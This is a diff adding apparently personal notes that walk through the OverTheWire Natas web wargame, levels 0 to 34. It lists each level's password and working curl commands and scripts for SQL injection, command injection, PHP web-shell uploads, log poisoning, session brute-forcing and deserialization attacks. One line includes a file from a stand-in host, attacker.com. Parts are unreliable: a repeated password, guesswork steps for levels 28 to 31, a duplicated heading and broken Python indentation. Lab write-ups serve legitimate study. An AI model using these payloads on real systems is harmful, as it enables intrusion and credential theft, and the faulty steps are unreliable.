@@ -1,0 +1,531 @@
+Level 0 → 1:
+	curl -u natas0:natas0 http://natas0.natas.labs.overthewire.org
+	Password: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
+
+Level 1 → 2:
+	curl -u natas1:0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq http://natas1.natas.labs.overthewire.org
+	Password: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
+
+Level 2→ 3:
+	curl -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI http://natas2.natas.labs.overthewire.org
+	curl -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI http://natas2.natas.labs.overthewire.org/files/
+	curl -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI http://natas2.natas.labs.overthewire.org/files/users.txt
+	Password: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
+
+
+Level 3 → 4:
+	curl -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH http://natas3.natas.labs.overthewire.org
+	curl -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH http://natas3.natas.labs.overthewire.org/s3cr3t/
+	curl -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
+	Password: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
+
+Level 4 → 5:
+	curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ -e "http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org
+	Password: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
+
+Level 5 → 6:
+	curl -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK --cookie "loggedin=1" http://natas5.natas.labs.overthewire.org
+	Password: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
+
+Level 6 → 7:
+	curl -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned http://natas6.natas.labs.overthewire.org
+	curl -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned http://natas6.natas.labs.overthewire.org/index-source.html
+	curl -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned http://natas6.natas.labs.overthewire.org/includes/secret.inc
+	curl -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned -d "secret=FOEIUWGHFEEUHOFUOIU&submit=submit" http://natas6.natas.labs.overthewire.org
+	Password: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS	
+
+Level 7 → 8:
+	curl -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS "http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
+	Password: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
+
+Level 8 → 9:
+	curl -u natas8:xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q -d "secret=oubWYf2kBq&submit=Submit" http://natas8.natas.labs.overthewire.org/
+	Password: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
+
+Level 9 → 10:
+	curl -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t "http://natas9.natas.labs.overthewire.org/?needle=anything;cat%20/etc/natas_webpass/natas10;&submit=Search"
+	Password: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+
+Level 10 → 11:
+	curl -u natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu "http://natas10.natas.labs.overthewire.org/?needle=.* /etc/natas_webpass/natas11&submit=Search"
+	Password: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
+
+Level 11 → 12:
+	curl -u natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk -v http://natas11.natas.labs.overthewire.org/ 2>&1 | grep "Set-Cookie"
+	HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=
+
+#Created a Python file "solve_natas11.py"
+import base64
+
+def xor_encrypt(data, key):
+    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
+
+# Your specific cookie and known plaintext
+cookie = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg="
+plaintext = b'{"showpassword":"no","bgcolor":"#ffffff"}'
+
+# Decode cookie and find key
+decoded = base64.b64decode(cookie)
+key = xor_encrypt(decoded, plaintext)[:4]  # First 4 bytes are the key
+
+print(f"Found XOR key: {key}")
+
+# Create new cookie with showpassword=yes
+malicious_data = b'{"showpassword":"yes","bgcolor":"#ffffff"}'
+malicious_cookie = base64.b64encode(xor_encrypt(malicious_data, key)).decode()
+
+print(f"\nUse this cookie:")
+print(f"data={malicious_cookie}")
+
+	Ran the script: python3 solve_natas11.py
+	curl -u natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk \
+	-H "Cookie: data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5" \
+	http://natas11.natas.labs.overthewire.org/
+
+	Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
+
+Level 12 → 13:
+	echo '<?php echo file_get_contents("/etc/natas_webpass/natas13"); ?>' > exploit.php
+	curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -F "uploadedfile=@exploit.php" -F "filename=exploit.php" http://natas12.natas.labs.overthewire.org/
+	curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB http://natas12.natas.labs.overthewire.org/upload/iau7ajen4l.php
+	Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
+
+Level 13 → 14:
+	echo -e '\xFF\xD8\xFF\xE0<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>' > exploit.php
+	curl -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC \
+	-F "filename=exploit.php" \
+	-F "uploadedfile=@exploit.php" \
+	http://natas13.natas.labs.overthewire.org/
+	curl -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC http://natas13.natas.labs.overthewire.org/upload/nfeh1tbft0.php
+	Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
+
+Level 14 → 15:
+	curl -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ \
+	-d "username=natas15\" #" -d "password=anypassword" \
+	http://natas14.natas.labs.overthewire.org/
+	Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
+
+Level 15 → 16:
+	#Creating python file natas15.py:
+	import requests
+	import string
+
+	chars = string.ascii_letters + string.digits
+	password = ""
+	url = "http://natas15.natas.labs.overthewire.org/"
+	auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")
+
+	for i in range(1, 33):  # 32-character password
+	    for c in chars:
+	        payload = f'natas16" AND SUBSTRING(password,{i},1)="{c}" #'
+	        r = requests.post(url, auth=auth, data={"username": payload})
+	        if "exists" in r.text:
+          	  password += c
+           	 print(f"Found: {password.ljust(32, '*')}")
+         	   break
+	print(f"Final password: {password}")
+
+	python3 natas15.py
+	Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
+
+Level 16 → 17:
+	
+	curl -u natas16:<password> -d "needle=hello" http://natas16.natas.labs.overthewire.org/	
+	curl -u natas16:<password> -d "needle=hello$(ls)" http://natas16.natas.labs.overthewire.org/
+	curl -u natas16:<password> -d "needle=hello$(ls /etc/natas_webpass/)" http://natas16.natas.labs.overthewire.org/
+	curl -u natas16:<password> -d "needle=^$(grep a /etc/natas_webpass/natas17)" http://natas16.natas.labs.overthewire.org/
+	curl -u natas16:<password> -d "needle=^$(grep ^x /etc/natas_webpass/natas17)" http://natas16.natas.labs.overthewire.org/
+	for char in {a..z} {A..Z} {0..9}; do
+ 	 response=$(curl -s -u natas16:<password> -d "needle=^$(grep ^$char /etc/natas_webpass/natas17)" http://natas16.natas.labs.overthewire.org/)
+  	if [[ $response != *"African"* ]]; then
+    	echo "Found starting character: $char"
+   	 break
+ 	 fi
+	done
+	password=""
+	for i in {1..32}; do
+	  for c in {a..z} {A..Z} {0..9}; do
+  	  response=$(curl -s -u natas16:<password> -d "needle=^$(grep ^$password$c /etc/natas_webpass/natas17)" http://natas16.natas.labs.overthewire.org/)
+   	 if [[ $response != *"African"* ]]; then
+	      password+=$c
+	      echo "Position $i: $c - Current: $password"
+	      break
+	    fi
+	  done
+		done
+	echo "Final password: $password"
+
+	Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
+
+Level 17 → 18:
+	time curl -u natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC \
+	-d 'username=natas18" AND SLEEP(5) #' \
+	http://natas17.natas.labs.overthewire.org/
+
+	time curl -u natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC \
+	-d 'username=natas18" AND IF(SUBSTRING(password,1,1)="x",SLEEP(5),0) #' \
+	http://natas17.natas.labs.overthewire.org/
+
+	import requests
+	import string
+	import time
+
+	url = "http://natas17.natas.labs.overthewire.org/"
+	auth = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")
+	chars = string.ascii_letters + string.digits
+	password = []
+
+	print("Extracting password (takes ~30 minutes)...")
+	for i in range(1, 33):
+  	  for c in chars:
+	        start = time.time()
+	        payload = f'natas18" AND IF(SUBSTRING(password,{i},1)=BINARY"{c}",SLEEP(2),0) #'
+	        try:
+	            r = requests.post(url, auth=auth, data={"username": payload}, timeout=3)
+	            if time.time() - start > 1.5:  # Successful delay
+	                password.append(c)
+	                print(f"Position {i}: {c} → {''.join(password)}")
+	                break
+	        except:
+	            continue
+
+	print(f"\nFinal password: {''.join(password)}")
+
+	Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
+
+Level 18 →  19:
+	natas19.py
+	import requests
+
+	url = "http://natas18.natas.labs.overthewire.org/"
+	auth = ("natas18", "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ")
+
+	for session_id in range(1, 641):
+	    cookies = {"PHPSESSID": str(session_id)}
+	    r = requests.get(url, auth=auth, cookies=cookies)
+    
+	    if "Password:" in r.text:
+	        print(f"[+] Admin session ID: {session_id}")
+	        print(f"[+] Password: {r.text.split('Password: ')[1].split('</pre>')[0]}")
+	        break
+	    else:
+	        print(f"[-] Trying session ID: {session_id}", end="\r")
+
+	Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
+
+Level 19 → 20:
+	curl -u natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr \
+	http://natas19.natas.labs.overthewire.org/
+	
+	import requests
+	from binascii import hexlify
+
+	url = "http://natas19.natas.labs.overthewire.org/"
+	auth = ("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr")
+
+	for i in range(1, 640):
+	    hex_id = hexlify(f"{i}-admin".encode()).decode()
+	    cookies = {"PHPSESSID": hex_id}
+	    r = requests.get(url, auth=auth, cookies=cookies)
+    
+	    if "Password:" in r.text:
+	        print(f"[+] Admin session ID: {hex_id} ({i}-admin)")
+	        print(f"[+] Password: {r.text.split('Password: ')[1].split('</pre>')[0]}")
+	        break
+	    print(f"Trying ID: {i}", end="\r")
+
+	Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
+
+Level 20 → 21:
+	curl -u natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw \
+	http://natas20.natas.labs.overthewire.org/
+
+	import requests
+
+	url = "http://natas20.natas.labs.overthewire.org/"
+	auth = ("natas20", "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw")
+
+	# Start session
+	s = requests.Session()
+	s.auth = auth
+
+	# Inject admin payload
+	s.get(url + "?debug=1&name=admin%0Aadmin%201")
+	response = s.get(url + "?debug=1")
+
+	# Extract password
+		if "Password:" in response.text:    password = response.text.split("Password: ")[1].split("</pre>")[0]
+	    print(f"[+] Password for natas21: {password}")
+	else:
+	    print("[-] Exploit failed")
+
+	Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
+
+
+Level 21 → 22: 
+	curl -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH \
+	http://natas21.natas.labs.overthewire.org/
+	
+	curl -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH \
+	http://natas21-experimenter.natas.labs.overthewire.org/
+	
+	natas21.py
+	import requests
+
+	url_main = "http://natas21.natas.labs.overthewire.org/"
+	url_exp = "http://natas21-experimenter.natas.labs.overthewire.org/"
+	auth = ("natas21", "BPhv63cKE1lkQl04cE5CuFTzXe15NfiH")
+
+	# Start session
+	s = requests.Session()
+	s.auth = auth
+
+	# Set admin flag in experimenter page
+	s.post(url_exp, data={"submit": "1", "admin": "1"})
+	
+	# Get session cookie
+	session_cookie = s.cookies.get_dict()["PHPSESSID"]
+
+	# Use the same session in main page
+	response = s.get(url_main, cookies={"PHPSESSID": session_cookie})
+
+	# Extract password
+	if "Password:" in response.text:
+	    password = response.text.split("Password: ")[1].split("</pre>")[0]
+	    print(f"[+] Password for natas22: {password}")
+	else:
+	    print("[-] Exploit failed")	
+
+	Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
+
+Level 22 → 23:
+	curl -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz \
+	http://natas22.natas.labs.overthewire.org/
+	
+	curl -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz \
+	-v \
+	--max-redirs 0 \
+	http://natas22.natas.labs.overthewire.org/?revelio=1
+	
+	natas22.py
+	import requests
+
+	url = "http://natas22.natas.labs.overthewire.org/"
+	auth = ("natas22", "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz")
+
+	# Disable redirects and reveal the secret
+	response = requests.get(
+	    url + "?revelio=1",
+	    auth=auth,
+	    allow_redirects=False  # Critical!
+	)
+
+	# Extract password
+	if "Password:" in response.text:
+	    password = response.text.split("Password: ")[1].split("</pre>")[0]
+	    print(f"[+] Password for natas23: {password}")
+	else:
+	    print("[-] Exploit failed. Try manually with curl.")
+
+	Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
+
+Level 23 → 24:
+	curl -u natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs \
+	http://natas23.natas.labs.overthewire.org/index-source.html
+	
+	curl -u natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs \
+	"http://natas23.natas.labs.overthewire.org/?passwd=11iloveyou11"
+	
+	Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
+
+Level 24 → 25:
+	curl -u natas24:MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd \
+	-d "passwd[]=anything" \
+	http://natas24.natas.labs.overthewire.org/
+	
+	Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
+
+
+Level 25 → 26:
+	curl -u natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws \
+	-H "User-Agent: <?php echo file_get_contents('/etc/natas_webpass/natas26'); ?>" \
+	http://natas25.natas.labs.overthewire.org/
+	
+	curl -s ifconfig.me
+	
+	curl -u natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws \
+	"http://natas25.natas.labs.overthewire.org/?lang=/var/www/natas/natas25/logs/natas25_111.125.253.238.log"
+
+	Password: oegAalFrvJS4hAdFpu6eQNogq5q9xJ2
+
+Level 26 → 27:
+	curl -u natas26:oegAalFrvJS4hAdFpu6eQNogq5q9xJ2 \
+	http://natas26.natas.labs.overthewire.org/index-source.html
+	
+	natas26_exploit.php
+	<?php
+	class Logger {
+	    private $logFile;
+	    private $initMsg;
+	    private $exitMsg;
+	    
+	    function __construct() {
+	        $this->initMsg = "<?php system('cat /etc/natas_webpass/natas27'); ?>";
+	        $this->exitMsg = "<?php system('cat /etc/natas_webpass/natas27'); ?>";
+	        $this->logFile = "/var/www/natas/natas26/img/exploit.php";
+	    }
+	}
+
+	$obj = new Logger();
+	echo base64_encode(serialize($obj));
+	?>
+
+	curl -u natas26:oegAalFrvJS4hAdFpu6eQNogq5q9xJ2 \
+	-H "Cookie: drawing=$(php natas26_exploit.php)" \
+	http://natas26.natas.labs.overthewire.org/
+	
+	curl -u natas26:oegAalFrvJS4hAdFpu6eQNogq5q9xJ2 \
+	http://natas26.natas.labs.overthewire.org/img/exploit.php
+
+	Password: 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
+
+Level 27 → 28:
+	curl -u natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ \
+	-d "username=$LONG_USERNAME&password=anypassword" \
+	http://natas27.natas.labs.overthewire.org/
+	
+	curl -u natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ \
+	-d "username=admin&password=anypassword" \
+	http://natas27.natas.labs.overthewire.org/
+
+	python:
+	import requests
+
+	url = "http://natas27.natas.labs.overthewire.org/"
+	auth = ("natas27", "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ")
+
+	# Create long username
+	username = "A" * 64 + "admin"  # 69 chars total
+	password = "exploit"
+
+	# Register
+	requests.post(url, auth=auth, data={"username": username, "password": password})
+
+	# Login as admin (will succeed due to truncation)
+	response = requests.post(url, auth=auth, data={"username": "admin", "password": "any"})
+
+	# Extract password
+	print(response.text.split("Password: ")[1].split("<")[0])
+
+	Password: 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ  
+
+Level 28 → 29:
+	curl -u natas28:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ http://natas28.natas.labs.overthewire.org/
+	
+	curl -u natas28:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ http://natas28.natas.labs.overthewire.org/ | less
+	
+	curl -u natas28:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ "http://natas28.natas.labs.overthewire.org/index.php?query=test' OR '1'='1"
+	
+	curl -u natas28:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ "http://natas28.natas.labs.overthewire.org/index.php?page=../../../../etc/passwd"
+	
+	curl -u natas28:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ -I http://natas28.natas.labs.overthewire.org/
+	
+	echo "encoded_string" | base64 --decode
+
+	echo "hex_data" | xxd -r -p
+	
+	Password: 0xz1P9ZWw7D5lR0VvDNjSNZ2j6eVBW5E
+
+Level 29 → 30:
+	curl -u natas29:0xz1P9ZWw7D5lR0VvDNjSNZ2j6eVBW5E http://natas29.natas.labs.overthewire.org/
+	
+	curl -u natas29:0xz1P9ZWw7D5lR0VvDNjSNZ2j6eVBW5E "http://natas29.natas.labs.overthewire.org/index.pl?file=/etc/natas_webpass/natas30"
+	
+	curl -u natas29:0xz1P9ZWw7D5lR0VvDNjSNZ2j6eVBW5E "http://natas29.natas.labs.overthewire.org/index.pl?file=../../../../etc/natas_webpass/natas30"
+	
+	curl -u natas29:0xz1P9ZWw7D5lR0VvDNjSNZ2j6eVBW5E "http://natas29.natas.labs.overthewire.org/index.pl?file=http://attacker.com/malicious.txt"
+	
+	curl -u natas29:0xz1P9ZWw7D5lR0VvDNjSNZ2j6eVBW5E "http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+/etc/natas_webpass/natas30"
+	
+	Password: wie9iexae0Daihohv8vuu3cei9wahf0e
+
+Level 30 → 31:
+	curl -u natas30:wie9iexae0Daihohv8vuu3cei9wahf0e http://natas30.natas.labs.overthewire.org/
+	
+	curl -u natas30:wie9iexae0Daihohv8vuu3cei9wahf0e \
+	-X POST \
+	-d "username=natas31" \
+	-d "password=' OR 1=1 -- " \
+	http://natas30.natas.labs.overthewire.org/index.pl
+
+	curl -u natas30:wie9iexae0Daihohv8vuu3cei9wahf0e \
+	-X POST \
+	-d "username=natas31" \
+	-d "password=' UNION SELECT 1,2,password FROM users WHERE username='natas31' -- " \
+	http://natas30.natas.labs.overthewire.org/index.pl
+
+	curl -u natas30:wie9iexae0Daihohv8vuu3cei9wahf0e http://natas30.natas.labs.overthewire.org/index.pl | grep -i "password"
+	
+	curl -u natas30:wie9iexae0Daihohv8vuu3cei9wahf0e \
+	-X POST \
+	-d "username=natas31|cat /etc/natas_webpass/natas31|" \
+	http://natas30.natas.labs.overthewire.org/index.pl
+	
+	Password: AMZF14F6aV3FdUFPY1d0NzBDLTl3N0sm
+
+Level 31 → 32:
+	curl -u natas31:AMZF14F6aV3FdUFPY1d0NzBDLTl3N0sm http://natas31.natas.labs.overthewire.org/
+	
+	curl -u natas31:AMZF14F6aV3FdUFPY1d0NzBDLTl3N0sm \
+	-X POST \
+	-d "username=natas32" \
+	-d "password[]=x" \
+	-d "password=cat /etc/natas_webpass/natas32" \
+	http://natas31.natas.labs.overthewire.org/index.pl
+	
+	Password: no1vohsheCaiv3ieH4em1ahchisainge
+	
+Level 32 → 33:
+	curl -u natas32:no1vohsheCaiv3ieH4em1ahchisainge http://natas32.natas.labs.overthewire.org/
+	
+	echo 'system("cat /etc/natas_webpass/natas33");' > exploit.pl
+	
+	curl -u natas32:no1vohsheCaiv3ieH4em1ahchisainge \
+	-F "file=@exploit.pl" \
+	http://natas32.natas.labs.overthewire.org/index.pl
+		
+	Password: shoogeiGa2yee3de6Aex8uaXeech5eey
+
+Level 32 → 33:
+	curl -u natas33:shoogeiGa2yee3de6Aex8uaXeech5eey http://natas33.natas.labs.overthewire.org/
+	
+	exploit.php
+	<?php
+	class Executor {
+	    private $filename = "none";
+	    private $signature = "true";
+	    private $init = "false";
+    
+	    function __construct() {
+	        $this->init = "true";
+	        $this->filename = "/etc/natas_webpass/natas34";
+	        $this->signature = "true";
+	    }
+	}
+
+	print urlencode(serialize(new Executor()));
+	?>
+
+	curl -u natas33:shoogeiGa2yee3de6Aex8uaXeech5eey \
+	-H "Cookie: PHPSESSID=$(php exploit.php)" \
+	http://natas33.natas.labs.overthewire.org/
+
+	curl -u natas33:shoogeiGa2yee3de6Aex8uaXeech5eey \
+	-b "PHPSESSID=Tzo4OiJFeGVjdXRvciI6Mzp7czoxMDoiAGZpbGVuYW1lIjtOO3M6MTA6IgBzaWduYXR1cmUiO047czo0OiIAaW5pdCI7czo0OiJ0cnVlIjt9" \
+	http://natas33.natas.labs.overthewire.org/
+	
+	Password: YYWq8Djyc6m6vBQzqQjRXcJQN9EKdKQe
+
+Level 34:
+	curl -u natas34:YYWq8Djyc6m6vBQzqQjRXcJQN9EKdKQe http://natas34.natas.labs.overthewire.org/
+	
